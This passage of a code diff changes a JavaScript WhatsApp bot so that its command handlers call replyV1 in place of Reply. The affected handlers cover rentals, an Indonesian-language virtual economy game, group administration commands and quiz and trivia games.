-        return Reply(`✅ Masa sewa ditambah.\n🆔 *${rental.id}*\n📅 Expired baru: *${new Date(rental.expiresAt).toLocaleString('id-ID')}*`)
+        return replyV1(`✅ Masa sewa ditambah.\n🆔 *${rental.id}*\n📅 Expired baru: *${new Date(rental.expiresAt).toLocaleString('id-ID')}*`)
     } catch (e) {
-        return Reply(`❌ ${e?.message || e}`)
+        return replyV1(`❌ ${e?.message || e}`)
     }
 }
 break
@@ -11248,11 +11221,11 @@ case 'ceksewa':
 case 'sewastatus': {
     const target = isOwner && args[0] ? args[0] : m.sender
     const rental = storeService.getRental(target)
-    if (!rental) return Reply('❌ Data sewa aktif tidak ditemukan.')
+    if (!rental) return replyV1('❌ Data sewa aktif tidak ditemukan.')
     const remaining = Math.max(0, rental.expiresAt - Date.now())
     const days = Math.floor(remaining / 86400000)
     const hours = Math.floor((remaining % 86400000) / 3600000)
-    return Reply(
+    return replyV1(
         `╭─〔 ⏳ STATUS SEWA 〕\n` +
         `║ 🆔 Sewa    : *${rental.id}*\n` +
         `║ 📦 Produk  : *${rental.productName}*\n` +
@@ -11265,9 +11238,9 @@ case 'sewastatus': {
 break
 case 'orders':
 case 'storeorders': {
-    if (!isOwner) return Reply(mess.owner)
+    if (!isOwner) return replyV1(mess.owner)
     const list = storeService.listOrders(50)
-    if (!list.length) return Reply('📦 Belum ada order store yang tercatat.')
+    if (!list.length) return replyV1('📦 Belum ada order store yang tercatat.')
 
     const pageSize = 7
     const totalPages = Math.max(1, Math.ceil(list.length / pageSize))
@@ -11468,7 +11441,7 @@ case 'me': {
         `│ Free limit : ${freeLimit}\n` +
         `╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯`
     if (cardBuffer) return conn.sendMessage(m.chat, { image: cardBuffer, caption }, { quoted: m })
-    return Reply(caption)
+    return replyV1(caption)
 }
 break
 
@@ -11478,7 +11451,7 @@ case 'balance':
 case 'saldo': {
     const p = economy.profile(m.sender)
 
-    return Reply(
+    return replyV1(
         `╭─〔 💰 ECONOMY PROFILE 〕\n` +
         `║ 👤 User: @${m.sender.split('@')[0]}\n` +
         `║ 💵 Wallet: Rp${economy.formatMoney(p.wallet)}\n` +
@@ -11500,10 +11473,10 @@ case 'daily': {
     const result = economy.daily(m.sender)
 
     if (!result.ok) {
-        return Reply('❌ Daily hari ini sudah diambil.')
+        return replyV1('❌ Daily hari ini sudah diambil.')
     }
 
-    return Reply(
+    return replyV1(
         `🎁 *DAILY REWARD*\n\n` +
         `💰 Reward: Rp${economy.formatMoney(result.reward)}\n` +
         `🔥 Streak: ${result.streak} hari`
@@ -11515,10 +11488,10 @@ case 'weekly': {
     const result = economy.weekly(m.sender)
 
     if (!result.ok) {
-        return Reply('❌ Weekly minggu ini sudah diambil.')
+        return replyV1('❌ Weekly minggu ini sudah diambil.')
     }
 
-    return Reply(
+    return replyV1(
         `🎁 *WEEKLY REWARD*\n\n` +
         `💰 Reward: Rp${economy.formatMoney(result.reward)}\n` +
         `🔥 Streak: ${result.streak} minggu`
@@ -11530,10 +11503,10 @@ case 'monthly': {
     const result = economy.monthly(m.sender)
 
     if (!result.ok) {
-        return Reply('❌ Monthly bulan ini sudah diambil.')
+        return replyV1('❌ Monthly bulan ini sudah diambil.')
     }
 
-    return Reply(
+    return replyV1(
         `🎁 *MONTHLY REWARD*\n\n` +
         `💰 Reward: Rp${economy.formatMoney(result.reward)}\n` +
         `🔥 Streak: ${result.streak} bulan`
@@ -11546,7 +11519,7 @@ case 'tf': {
         m.mentionedJid?.[0]
 
     if (!target) {
-        return Reply(
+        return replyV1(
             `❌ Tag user tujuan.\n\n` +
             `Contoh:\n` +
             `${prefix}transfer @user 10k`
@@ -11554,7 +11527,7 @@ case 'tf': {
     }
 
     if (target === m.sender) {
-        return Reply(
+        return replyV1(
             '❌ Tidak bisa transfer ke diri sendiri.'
         )
     }
@@ -11575,7 +11548,7 @@ case 'tf': {
         )
 
     if (!amount) {
-        return Reply(
+        return replyV1(
             `❌ Jumlah transfer tidak valid.\n` +
             `Saldo: Rp${economy.formatMoney(balance)}`
         )
@@ -11589,12 +11562,12 @@ case 'tf': {
         )
 
     if (!result.ok) {
-        return Reply(
+        return replyV1(
             `❌ Saldo tidak cukup.`
         )
     }
 
-    return Reply(
+    return replyV1(
         `✅ Transfer berhasil.\n\n` +
         `👤 Tujuan: @${target.split('@')[0]}\n` +
         `💰 Jumlah: Rp${economy.formatMoney(amount)}\n` +
@@ -11610,20 +11583,20 @@ case 'kerja': {
 
     if (!result.ok) {
         if (result.error === 'COOLDOWN') {
-            return Reply(
+            return replyV1(
                 `⏳ Kamu masih lelah.\n` +
                 `Tunggu ${economy.msToText(result.remaining)}.`
             )
         }
 
         if (result.error === 'ENERGY') {
-            return Reply(
+            return replyV1(
                 '⚡ Energy tidak cukup. Gunakan .rest atau makanan.'
             )
         }
     }
 
-    return Reply(
+    return replyV1(
         `💼 *WORK*\n\n` +
         `👷 Pekerjaan: ${result.job}\n` +
         `💰 Penghasilan: Rp${economy.formatMoney(result.reward)}\n` +
@@ -11634,14 +11607,14 @@ break
 case 'rob':
 case 'merampok': {
     if (!m.isGroup) {
-        return Reply(mess.group)
+        return replyV1(mess.group)
     }
 
     const target =
         m.mentionedJid?.[0]
 
     if (!target) {
-        return Reply(
+        return replyV1(
             `Contoh: ${prefix}rob @user`
         )
     }
@@ -11654,38 +11627,38 @@ case 'merampok': {
 
     if (!result.ok) {
         if (result.error === 'COOLDOWN') {
-            return Reply(
+            return replyV1(
                 `⏳ Tunggu ${economy.msToText(result.remaining)}.`
             )
         }
 
         if (result.error === 'SELF') {
-            return Reply(
+            return replyV1(
                 '❌ Tidak bisa merampok diri sendiri.'
             )
         }
 
         if (result.error === 'POOR') {
-            return Reply(
+            return replyV1(
                 '❌ Target terlalu miskin.'
             )
         }
 
         if (result.error === 'ENERGY') {
-            return Reply(
+            return replyV1(
                 '⚡ Energy tidak cukup.'
             )
         }
     }
 
     if (result.success) {
-        return Reply(
+        return replyV1(
             `🔫 *PERAMPOKAN BERHASIL!*\n\n` +
             `💰 Kamu mendapatkan Rp${economy.formatMoney(result.amount)}`
         )
     }
 
-    return Reply(
+    return replyV1(
         `🚔 *PERAMPOKAN GAGAL!*\n\n` +
         `💸 Denda: Rp${economy.formatMoney(result.fine)}`
     )
@@ -11716,7 +11689,7 @@ case 'toko': {
         `Contoh:\n` +
         `${prefix}buy bread 2`
 
-    return Reply(text)
+    return replyV1(text)
 }
 break
 case 'buy':
@@ -11739,24 +11712,24 @@ case 'beli': {
 
     if (!result.ok) {
         if (result.error === 'ITEM') {
-            return Reply(
+            return replyV1(
                 `❌ Item tidak ditemukan.\nGunakan ${prefix}shop`
             )
         }
 
         if (result.error === 'BALANCE') {
-            return Reply(
+            return replyV1(
                 `❌ Saldo tidak cukup.\n` +
                 `Saldo: Rp${economy.formatMoney(result.balance)}`
             )
         }
 
-        return Reply(
+        return replyV1(
             '❌ Jumlah pembelian tidak valid.'
         )
     }
 
-    return Reply(
+    return replyV1(
         `✅ Pembelian berhasil.\n\n` +
         `📦 Item: ${item}\n` +
         `🔢 Jumlah: ${amount}\n` +
@@ -11805,7 +11778,7 @@ case 'tas': {
         `🎣 Fishing Rod: ${inv.tools.fishingrod}\n` +
         `🪓 Axe: ${inv.tools.axe}`
 
-    return Reply(text)
+    return replyV1(text)
 }
 break
 case 'sell':
@@ -11828,19 +11801,19 @@ case 'jual': {
 
     if (!result.ok) {
         if (result.error === 'ITEM') {
-            return Reply(
+            return replyV1(
                 `❌ Item tidak bisa dijual.`
             )
         }
 
         if (result.error === 'INVENTORY') {
-            return Reply(
+            return replyV1(
                 '❌ Jumlah item tidak mencukupi.'
             )
         }
     }
 
-    return Reply(
+    return replyV1(
         `✅ Item berhasil dijual.\n\n` +
         `📦 Item: ${item}\n` +
         `🔢 Jumlah: ${amount}\n` +
@@ -11868,25 +11841,25 @@ case 'pakai': {
 
     if (!result.ok) {
         if (result.error === 'NOT_USABLE') {
-            return Reply(
+            return replyV1(
                 '❌ Item tersebut tidak bisa digunakan.'
             )
         }
 
         if (result.error === 'INVENTORY') {
-            return Reply(
+            return replyV1(
                 '❌ Item tidak ada di inventory.'
             )
         }
 
         if (result.error === 'FULL_ENERGY') {
-            return Reply(
+            return replyV1(
                 '⚡ Energy kamu sudah penuh.'
             )
         }
     }
 
-    return Reply(
+    return replyV1(
         `🍴 Berhasil menggunakan ${item}.\n\n` +
         `⚡ Energy +${result.energy}\n` +
         `⚡ Energy sekarang: ${result.current}/100`
@@ -11903,20 +11876,20 @@ case 'memancing': {
 
     if (!result.ok) {
         if (result.error === 'COOLDOWN') {
-            return Reply(
+            return replyV1(
                 `⏳ Tunggu ${economy.msToText(result.remaining)}.`
             )
         }
 
         if (result.error === 'TOOL') {
-            return Reply(
+            return replyV1(
                 `🎣 Kamu membutuhkan Fishing Rod.\n` +
                 `Beli: ${prefix}buy fishingrod 1`
             )
         }
 
         if (result.error === 'ENERGY') {
-            return Reply(
+            return replyV1(
                 '⚡ Energy tidak cukup.'
             )
         }
@@ -11940,7 +11913,7 @@ case 'memancing': {
     text +=
         `\n🔧 Rod tersisa: ${result.toolLeft} penggunaan`
 
-    return Reply(text)
+    return replyV1(text)
 }
 break
 case 'mining':
@@ -11953,20 +11926,20 @@ case 'tambang': {
 
     if (!result.ok) {
         if (result.error === 'COOLDOWN') {
-            return Reply(
+            return replyV1(
                 `⏳ Tunggu ${economy.msToText(result.remaining)}.`
             )
         }
 
         if (result.error === 'TOOL') {
-            return Reply(
+            return replyV1(
                 `⛏️ Kamu membutuhkan Pickaxe.\n` +
                 `Beli: ${prefix}buy pickaxe 1`
             )
         }
 
         if (result.error === 'ENERGY') {
-            return Reply(
+            return replyV1(
                 '⚡ Energy tidak cukup.'
             )
         }
@@ -11986,7 +11959,7 @@ case 'tambang': {
     text +=
         `\n🔧 Pickaxe tersisa: ${result.toolLeft}`
 
-    return Reply(text)
+    return replyV1(text)
 }
 break
 case 'nebang':
@@ -11999,26 +11972,26 @@ case 'woodcutting': {
 
     if (!result.ok) {
         if (result.error === 'COOLDOWN') {
-            return Reply(
+            return replyV1(
                 `⏳ Tunggu ${economy.msToText(result.remaining)}.`
             )
         }
 
         if (result.error === 'TOOL') {
-            return Reply(
+            return replyV1(
                 `🪓 Kamu membutuhkan Axe.\n` +
                 `Beli: ${prefix}buy axe 1`
             )
         }
 
         if (result.error === 'ENERGY') {
-            return Reply(
+            return replyV1(
                 '⚡ Energy tidak cukup.'
             )
         }
     }
 
-    return Reply(
+    return replyV1(
         `🪓 *NEBANG*\n\n` +
         result.loot.map(
             x =>
@@ -12037,19 +12010,19 @@ case 'scavenge': {
 
     if (!result.ok) {
         if (result.error === 'COOLDOWN') {
-            return Reply(
+            return replyV1(
                 `⏳ Tunggu ${economy.msToText(result.remaining)}.`
             )
         }
 
         if (result.error === 'ENERGY') {
-            return Reply(
+            return replyV1(
                 '⚡ Energy tidak cukup.'
             )
         }
     }
 
-    return Reply(
+    return replyV1(
         `🗑️ *NYAMPAH*\n\n` +
         `Kamu menemukan:\n` +
         `📦 ${result.item}: ${result.amount}`
@@ -12065,26 +12038,26 @@ case 'hunt': {
 
     if (!result.ok) {
         if (result.error === 'COOLDOWN') {
-            return Reply(
+            return replyV1(
                 `⏳ Tunggu ${economy.msToText(result.remaining)}.`
             )
         }
 
         if (result.error === 'ENERGY') {
-            return Reply(
+            return replyV1(
                 '⚡ Energy tidak cukup.'
             )
         }
     }
 
     if (result.success) {
-        return Reply(
+        return replyV1(
             `🏹 *BERBURU BERHASIL!*\n\n` +
             `🥩 Daging: ${result.amount}`
         )
     }
 
-    return Reply(
+    return replyV1(
         '🏹 Kamu pulang tanpa hasil.'
     )
 }
@@ -12098,19 +12071,19 @@ case 'istirahat': {
 
     if (!result.ok) {
         if (result.error === 'COOLDOWN') {
-            return Reply(
+            return replyV1(
                 `⏳ Tunggu ${economy.msToText(result.remaining)}.`
             )
         }
 
         if (result.error === 'FULL') {
-            return Reply(
+            return replyV1(
                 '⚡ Energy sudah penuh.'
             )
         }
     }
 
-    return Reply(
+    return replyV1(
         `🛌 Beristirahat...\n\n` +
         `⚡ Energy +${result.restored}\n` +
         `⚡ Sekarang: ${result.energy}/100`
@@ -12124,7 +12097,7 @@ case 'kebun': {
             m.sender
         )
 
-    return Reply(
+    return replyV1(
         `🌾 *FARM*\n\n` +
         `🌱 Total plot: ${f.plots}\n` +
         `🌿 Sedang ditanam: ${f.planted}\n` +
@@ -12150,22 +12123,22 @@ case 'tanam': {
 
     if (!result.ok) {
         if (result.error === 'NO_PLOT') {
-            return Reply(
+            return replyV1(
                 '🌾 Semua plot sedang digunakan.'
             )
         }
 
         if (result.error === 'SEED') {
-            return Reply(
+            return replyV1(
                 `🌱 Bibit tidak cukup.\n` +
                 `Beli: ${prefix}buy seed 1`
             )
         }
 
-        return Reply('❌ Jumlah tidak valid.')
+        return replyV1('❌ Jumlah tidak valid.')
     }
 
-    return Reply(
+    return replyV1(
         `🌱 Berhasil menanam ${result.amount} bibit.\n\n` +
         `⏳ Waktu panen: sekitar 5 menit.`
     )
@@ -12180,12 +12153,12 @@ case 'harvest': {
         )
 
     if (!result.ok) {
-        return Reply(
+        return replyV1(
             '🌾 Belum ada tanaman yang siap dipanen.'
         )
     }
 
-    return Reply(
+    return replyV1(
         `🌾 *PANEN BERHASIL!*\n\n` +
         `🌾 Gandum: ${result.amount}`
     )
@@ -12213,7 +12186,7 @@ case 'business': {
         `${prefix}belibisnis <nama>\n` +
         `${prefix}claimbisnis`
 
-    return Reply(text)
+    return replyV1(text)
 }
 break
 
@@ -12230,27 +12203,27 @@ case 'buybusiness': {
 
     if (!result.ok) {
         if (result.error === 'BUSINESS') {
-            return Reply(
+            return replyV1(
                 `❌ Bisnis tidak ditemukan.\n` +
                 `Gunakan ${prefix}bisnis`
             )
         }
 
         if (result.error === 'OWNED') {
-            return Reply(
+            return replyV1(
                 '❌ Kamu sudah mempunyai bisnis.'
             )
         }
 
         if (result.error === 'BALANCE') {
-            return Reply(
+            return replyV1(
                 `❌ Saldo tidak cukup.\n` +
                 `Butuh: Rp${economy.formatMoney(result.business?.price || 0)}`
             )
         }
     }
 
-    return Reply(
+    return replyV1(
         `✅ Berhasil membeli bisnis *${result.business.name}*!\n\n` +
         `💰 Income bisa diambil setiap 24 jam dengan:\n` +
         `${prefix}claimbisnis`
@@ -12267,21 +12240,21 @@ case 'claimbusiness': {
 
     if (!result.ok) {
         if (result.error === 'NO_BUSINESS') {
-            return Reply(
+            return replyV1(
                 `❌ Kamu belum mempunyai bisnis.\n` +
                 `Gunakan ${prefix}bisnis`
             )
         }
 
         if (result.error === 'COOLDOWN') {
-            return Reply(
+            return replyV1(
                 `⏳ Business income belum tersedia.\n` +
                 `Tunggu ${economy.msToText(result.remaining)}.`
             )
         }
     }
 
-    return Reply(
+    return replyV1(
         `🏢 *BUSINESS INCOME*\n\n` +
         `💰 Kamu mendapatkan Rp${economy.formatMoney(result.reward)}`
     )
@@ -12295,7 +12268,7 @@ case 'missions': {
             m.sender
         )
 
-    return Reply(
+    return replyV1(
         `📜 *DAILY MISSION*\n\n` +
         `🎯 Tugas: ${mission.type}\n` +
         `📊 Progress: ${mission.progress}/${mission.target}\n` +
@@ -12316,18 +12289,18 @@ case 'claimmission': {
 
     if (!result.ok) {
         if (result.error === 'CLAIMED') {
-            return Reply(
+            return replyV1(
                 '✅ Mission hari ini sudah diklaim.'
             )
         }
 
-        return Reply(
+        return replyV1(
             `❌ Mission belum selesai.\n` +
             `Progress: ${result.progress}/${result.target}`
         )
     }
 
-    return Reply(
+    return replyV1(
         `🎉 *MISSION COMPLETED!*\n\n` +
         `💰 Reward: Rp${economy.formatMoney(result.reward)}`
     )
@@ -12354,7 +12327,7 @@ case 'achiev': {
             `↳ Reward: Rp${economy.formatMoney(a.reward)}\n\n`
     }
 
-    return Reply(text)
+    return replyV1(text)
 }
 break
 case 'leaderboard':
@@ -12410,7 +12383,7 @@ case 'pinjam': {
         !amount ||
         amount <= 0
     ) {
-        return Reply(
+        return replyV1(
             `Contoh: ${prefix}pinjam 50k`
         )
     }
@@ -12423,20 +12396,20 @@ case 'pinjam': {
 
     if (!result.ok) {
         if (result.error === 'HAS_LOAN') {
-            return Reply(
+            return replyV1(
                 `❌ Kamu masih memiliki hutang Rp${economy.formatMoney(result.amount)}`
             )
         }
 
         if (result.error === 'LIMIT') {
-            return Reply(
+            return replyV1(
                 `❌ Melebihi limit pinjaman.\n` +
                 `Limit: Rp${economy.formatMoney(result.maxLoan)}`
             )
         }
     }
 
-    return Reply(
+    return replyV1(
         `💳 *PINJAMAN*\n\n` +
         `💵 Diterima: Rp${economy.formatMoney(result.received)}\n` +
         `📈 Bunga: Rp${economy.formatMoney(result.fee)}\n` +
@@ -12457,7 +12430,7 @@ case 'repay': {
     if (
         user.loan.amount <= 0
     ) {
-        return Reply(
+        return replyV1(
             '✅ Kamu tidak mempunyai hutang.'
         )
     }
@@ -12471,7 +12444,7 @@ case 'repay': {
         )
 
     if (!amount) {
-        return Reply(
+        return replyV1(
             `Hutang kamu: Rp${economy.formatMoney(user.loan.amount)}`
         )
     }
@@ -12483,13 +12456,13 @@ case 'repay': {
         )
 
     if (!result.ok) {
-        return Reply(
+        return replyV1(
             `❌ Saldo tidak cukup.\n` +
             `Saldo: Rp${economy.formatMoney(result.balance)}`
         )
     }
 
-    return Reply(
+    return replyV1(
         `✅ Pembayaran hutang berhasil.\n\n` +
         `💸 Dibayar: Rp${economy.formatMoney(result.paid)}\n` +
         `📉 Sisa hutang: Rp${economy.formatMoney(result.remaining)}`
@@ -12498,26 +12471,26 @@ case 'repay': {
 break
 //
 case 'kickinactive': {
-    if (!m.isGroup) return Reply(mess.group)
+    if (!m.isGroup) return replyV1(mess.group)
     if (!isAdmins) {
-        return Reply(mess.admin)
+        return replyV1(mess.admin)
     }
     if (!isBotAdmins) {
-        return Reply(mess.botAdmin)
+        return replyV1(mess.botAdmin)
     }
     if (!groupMetadata) {
-        return Reply('❌ Gagal mengambil data grup.')
+        return replyV1('❌ Gagal mengambil data grup.')
     }
     const days = parseInt(args[0])
     if (!days || isNaN(days) || days < 1) {
-        return Reply(
+        return replyV1(
             `❌ Masukkan jumlah hari.\n\n` +
             `Contoh:\n` +
             `${prefix}kickinactive 30`
         )
     }
     if (days > 3650) {
-        return Reply('❌ Maksimal 3650 hari.')
+        return replyV1('❌ Maksimal 3650 hari.')
     }
     const groupDb = global.db.groups[m.chat]
     if (!groupDb.inactive) {
@@ -12550,7 +12523,7 @@ case 'kickinactive': {
         }
     }
     if (!candidates.length) {
-        return Reply(
+        return replyV1(
             `✅ Tidak ada member yang inactive selama ${days} hari atau lebih.`
         )
     }
@@ -12611,7 +12584,7 @@ case 'kickinactive': {
             )
         }
     }
-    await Reply(
+    await replyV1(
         `✅ *KICK INACTIVE SELESAI*\n\n` +
         `📅 Batas : ${days} hari\n` +
         `👥 Kandidat : ${candidates.length}\n` +
@@ -12623,16 +12596,16 @@ break;
 
 case 'tebaklagu':
 case 'guesssong': {
-    if (!m.isGroup) return Reply(mess.group)
+    if (!m.isGroup) return replyV1(mess.group)
     const key = gameKey(m.chat)
-    if (groupGameState.has(key)) return Reply('⚠️ Masih ada game yang berjalan. Jawab dulu pertanyaannya.')
+    if (groupGameState.has(key)) return replyV1('⚠️ Masih ada game yang berjalan. Jawab dulu pertanyaannya.')
     const song = randomItem(SONG_LIST)
     groupGameState.set(key, {
         type: 'tebaklagu',
         answer: song.answer,
         displayAnswer: song.answer
     })
-    return Reply(
+    return replyV1(
         `🎵 *TEBAK LAGU*\n\n` +
         `🎤 Penyanyi: *${song.artist}*\n` +
         `💡 Petunjuk: ${song.hint}\n\n` +
@@ -12644,13 +12617,13 @@ break
 
 case 'coinflip':
 case 'lemparkoin': {
-    return Reply(funMenu.coinFlip())
+    return replyV1(funMenu.coinFlip())
 }
 break
 
 case '8ball':
 case 'magic8ball': {
-    return Reply(funMenu.eightBall(text))
+    return replyV1(funMenu.eightBall(text))
 }
 break
 
@@ -12659,7 +12632,7 @@ case 'pujian': {
     const targetName = targetJid
         ? await conn.getName(targetJid).catch(() => targetJid.split('@')[0])
         : (text || pushname || m.sender.split('@')[0])
-    return Reply(funMenu.compliment(targetName))
+    return replyV1(funMenu.compliment(targetName))
 }
 break
 
@@ -12668,47 +12641,47 @@ case 'roast': {
     const targetName = targetJid
         ? await conn.getName(targetJid).catch(() => targetJid.split('@')[0])
         : (text || pushname || m.sender.split('@')[0])
-    return Reply(funMenu.roast(targetName))
+    return replyV1(funMenu.roast(targetName))
 }
 break
 
 case 'truth': {
-    if (!m.isGroup) return Reply(mess.group)
-    return Reply(funMenu.truth())
+    if (!m.isGroup) return replyV1(mess.group)
+    return replyV1(funMenu.truth())
 }
 break
 
 case 'dare': {
-    if (!m.isGroup) return Reply(mess.group)
-    return Reply(funMenu.dare())
+    if (!m.isGroup) return replyV1(mess.group)
+    return replyV1(funMenu.dare())
 }
 break
 
 case 'wouldyourather':
 case 'pilihsatu': {
-    return Reply(funMenu.wouldYouRather())
+    return replyV1(funMenu.wouldYouRather())
 }
 break
 
 case 'kerangajaib': {
-    return Reply(funMenu.magicShell(text))
+    return replyV1(funMenu.magicShell(text))
 }
 break
 
 case 'pilih': {
-    return Reply(funMenu.pickOption(text))
+    return replyV1(funMenu.pickOption(text))
 }
 break
 
 case 'ramalkeberuntungan': {
-    return Reply(funMenu.luck(pushname))
+    return replyV1(funMenu.luck(pushname))
 }
 break
 
 case 'quiz': {
-    if (!m.isGroup) return Reply(mess.group)
+    if (!m.isGroup) return replyV1(mess.group)
     const key = gameKey(m.chat)
-    if (groupGameState.has(key)) return Reply('⚠️ Masih ada game yang berjalan. Jawab dulu pertanyaannya.')
+    if (groupGameState.has(key)) return replyV1('⚠️ Masih ada game yang berjalan. Jawab dulu pertanyaannya.')
     const quiz = randomItem(QUIZ_LIST)
     groupGameState.set(key, {
         type: 'quiz',
@@ -12716,7 +12689,7 @@ case 'quiz': {
         accepted: [quiz.answer, String.fromCharCode(65 + quiz.a.findIndex(x => normalizeGameAnswer(x) === normalizeGameAnswer(quiz.answer)))],
         displayAnswer: quiz.answer
     })
-    return Reply(
+    return replyV1(
         `🧠 *QUIZ*\n\n` +
         `❓ ${quiz.q}\n\n` +
         quiz.a.map((x, i) => `${String.fromCharCode(65 + i)}. ${x}`).join('\n') +
@@ -12726,16 +12699,16 @@ case 'quiz': {
 break
 
 case 'trivia': {
-    if (!m.isGroup) return Reply(mess.group)
+    if (!m.isGroup) return replyV1(mess.group)
     const key = gameKey(m.chat)
-    if (groupGameState.has(key)) return Reply('⚠️ Masih ada game yang berjalan. Jawab dulu pertanyaannya.')
+    if (groupGameState.has(key)) return replyV1('⚠️ Masih ada game yang berjalan. Jawab dulu pertanyaannya.')
     const trivia = randomItem(TRIVIA_LIST)
     groupGameState.set(key, {
         type: 'trivia',
         answer: trivia.answer,
         displayAnswer: trivia.display
     })
-    return Reply(
+    return replyV1(
         `🌍 *TRIVIA*\n\n` +
         `❓ ${trivia.q}\n\n` +
         `✍️ Kirim jawabanmu!`
@@ -12745,10 +12718,10 @@ break
 
 case 'pinpesan':
 case 'pinmsg': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isAdmins && !isCreator) return Reply(mess.admin)
-    if (!isBotAdmins) return Reply(mess.botAdmin)
-    if (!m.quoted) return Reply(`❌ Reply pesan yang mau dipin.\nContoh: ${prefix}pinpesan`)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isAdmins && !isCreator) return replyV1(mess.admin)
+    if (!isBotAdmins) return replyV1(mess.botAdmin)
+    if (!m.quoted) return replyV1(`❌ Reply pesan yang mau dipin.\nContoh: ${prefix}pinpesan`)
     try {
         await conn.sendMessage(m.chat, {
             pin: {
@@ -12757,34 +12730,34 @@ case 'pinmsg': {
                 key: m.quoted.key
             }
         })
-        return Reply('📌 Pesan berhasil dipin selama 24 jam.')
+        return replyV1('📌 Pesan berhasil dipin selama 24 jam.')
     } catch (err) {
         console.error('[PIN ERROR]', err)
-        return Reply(`❌ Gagal pin pesan: ${err.message || err}`)
+        return replyV1(`❌ Gagal pin pesan: ${err.message || err}`)
     }
 }
 break
 
 case 'unpin': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isAdmins && !isCreator) return Reply(mess.admin)
-    if (!isBotAdmins) return Reply(mess.botAdmin)
-    if (!m.quoted) return Reply(`❌ Reply pesan yang ingin dilepas pin-nya.\nContoh: ${prefix}unpin`)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isAdmins && !isCreator) return replyV1(mess.admin)
+    if (!isBotAdmins) return replyV1(mess.botAdmin)
+    if (!m.quoted) return replyV1(`❌ Reply pesan yang ingin dilepas pin-nya.\nContoh: ${prefix}unpin`)
     try {
         await conn.sendMessage(m.chat, { pin: { type: 2, key: m.quoted.key } })
-        return Reply('✅ Pin pesan berhasil dilepas.')
+        return replyV1('✅ Pin pesan berhasil dilepas.')
     } catch (err) {
         console.error('[UNPIN ERROR]', err?.stack || err)
-        return Reply(`❌ Gagal melepas pin: ${err?.message || err}`)
+        return replyV1(`❌ Gagal melepas pin: ${err?.message || err}`)
     }
 }
 break
 
 case 'resetwarn': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isAdmins && !isCreator) return Reply(mess.admin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isAdmins && !isCreator) return replyV1(mess.admin)
     const target = m.mentionedJid?.[0] || m.quoted?.sender
-    if (!target) return Reply(`❌ Tag atau reply member yang ingin di-reset.\nContoh: ${prefix}resetwarn @user`)
+    if (!target) return replyV1(`❌ Tag atau reply member yang ingin di-reset.\nContoh: ${prefix}resetwarn @user`)
     const warnPath = path.join(__dirname, 'library', 'database', 'warn.json')
     let warnData = {}
     try {
@@ -12792,33 +12765,33 @@ case 'resetwarn': {
     } catch { warnData = {} }
     delete warnData[target]
     fs.writeFileSync(warnPath, JSON.stringify(warnData, null, 2))
-    return Reply(`✅ Warn @${target.split('@')[0]} berhasil di-reset.`)
+    return replyV1(`✅ Warn @${target.split('@')[0]} berhasil di-reset.`)
 }
 break
 
 case 'setprefix': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isAdmins && !isCreator) return Reply(mess.admin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isAdmins && !isCreator) return replyV1(mess.admin)
     const newPrefix = String(args[0] || '').trim()
     if (!newPrefix || newPrefix.length > 3 || /\s/.test(newPrefix)) {
-        return Reply(`❌ Prefix harus 1-3 karakter tanpa spasi.\nContoh: ${prefix}setprefix !`)
+        return replyV1(`❌ Prefix harus 1-3 karakter tanpa spasi.\nContoh: ${prefix}setprefix !`)
     }
     if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
     global.db.groups[m.chat].prefix = newPrefix
-    return Reply(`✅ Prefix grup berhasil diubah menjadi: *${newPrefix}*\nGunakan ${newPrefix}menu untuk mencoba.`)
+    return replyV1(`✅ Prefix grup berhasil diubah menjadi: *${newPrefix}*\nGunakan ${newPrefix}menu untuk mencoba.`)
 }
 break
 
 case 'oldestmember': {
-    if (!m.isGroup) return Reply(mess.group)
+    if (!m.isGroup) return replyV1(mess.group)
     const history = global.db?.groups?.[m.chat]?.joinhistory || {}
     const entries = Object.entries(history)
         .map(([jid, v]) => ({ jid, joinedAt: v?.firstJoinedAt || v?.joinedAt || v?.joins?.[0] }))
         .filter(x => x.joinedAt)
         .sort((a, b) => a.joinedAt - b.joinedAt)
-    if (!entries.length) return Reply('❌ Belum ada riwayat join yang tercatat.')
+    if (!entries.length) return replyV1('❌ Belum ada riwayat join yang tercatat.')
     const oldest = entries[0]
-    return Reply(
+    return replyV1(
         `👑 *OLDEST MEMBER*\n\n` +
         `👤 Member: @${oldest.jid.split('@')[0]}\n` +
         `📅 Bergabung pertama kali: ${new Date(oldest.joinedAt).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })} WIB`
@@ -12827,7 +12800,7 @@ case 'oldestmember': {
 break
 
 case 'joinhistory': {
-    if (!m.isGroup) return Reply(mess.group)
+    if (!m.isGroup) return replyV1(mess.group)
     const history = global.db?.groups?.[m.chat]?.joinhistory || {}
     const entries = []
     for (const [jid, v] of Object.entries(history)) {
@@ -12839,18 +12812,18 @@ case 'joinhistory': {
     }
     entries.sort((a, b) => b.time - a.time)
     const list = entries.slice(0, 30)
-    if (!list.length) return Reply('❌ Belum ada riwayat member masuk yang tercatat.')
+    if (!list.length) return replyV1('❌ Belum ada riwayat member masuk yang tercatat.')
     let out = `📥 *JOIN HISTORY*\n━━━━━━━━━━━━━━━━━━\n`
     for (let i = 0; i < list.length; i++) {
         const item = list[i]
         out += `${i + 1}. @${item.jid.split('@')[0]}\n   📅 ${new Date(item.time).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })} WIB\n`
     }
-    return Reply(out)
+    return replyV1(out)
 }
 break
 
 case 'lefthistory': {
-    if (!m.isGroup) return Reply(mess.group)
+    if (!m.isGroup) return replyV1(mess.group)
     const history = global.db?.groups?.[m.chat]?.joinhistory || {}
     const entries = []
     for (const [jid, v] of Object.entries(history)) {
@@ -12862,13 +12835,13 @@ case 'lefthistory': {
     }
     entries.sort((a, b) => b.time - a.time)
     const list = entries.slice(0, 30)
-    if (!list.length) return Reply('❌ Belum ada riwayat member keluar yang tercatat.')
+    if (!list.length) return replyV1('❌ Belum ada riwayat member keluar yang tercatat.')
     let out = `📤 *LEAVE HISTORY*\n━━━━━━━━━━━━━━━━━━\n`
     for (let i = 0; i < list.length; i++) {
         const item = list[i]
